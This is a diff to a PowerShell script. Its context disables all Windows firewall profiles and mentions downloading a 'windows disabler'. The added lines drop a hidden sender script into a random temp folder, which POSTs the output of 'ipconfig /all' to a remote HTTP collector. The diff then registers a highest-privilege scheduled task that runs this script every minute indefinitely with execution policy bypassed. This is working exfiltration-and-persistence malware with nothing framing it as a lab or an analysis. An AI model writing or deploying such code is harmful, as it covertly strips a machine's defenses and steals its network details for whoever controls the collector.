@@ -19,7 +19,7 @@ function New-RandomTempDirectory {
 }
 
 
-# $dirPath = New-RandomTempDirectory
+$dirPath = New-RandomTempDirectory
 # Write-Host "Created directory: $dirPath"
 
 # Download windows disabler
@@ -70,6 +70,41 @@ New-ItemProperty `
 
 # disable firewalls
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+# Make a sender file under the random temp folder
+$filePath = Join-Path $dirPath "sender.ps1"
+
+@'
+$url = "http://192.168.0.1:8080/Box"
+
+$output = ipconfig /all | Out-String
+
+Invoke-WebRequest `
+    -Uri $url `
+    -Method POST `
+    -Body $output `
+    -ContentType "text/plain"
+'@ | Set-Content -Path $filePath -Encoding UTF8
+
+# Create task schedule for sender.ps1
+$taskName   = "RunSenderPS1"
+
+$action = New-ScheduledTaskAction `
+    -Execute "powershell.exe" `
+    -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$filePath`""
+
+$trigger = New-ScheduledTaskTrigger `
+    -Once `
+    -At (Get-Date) `
+    -RepetitionInterval (New-TimeSpan -Minutes 1) `
+    -RepetitionDuration ([TimeSpan]::MaxValue)
+
+Register-ScheduledTask `
+    -TaskName $taskName `
+    -Action $action `
+    -Trigger $trigger `
+    -RunLevel Highest `
+    -Force
 
 
 # # Install OpenSSH Server if not installed
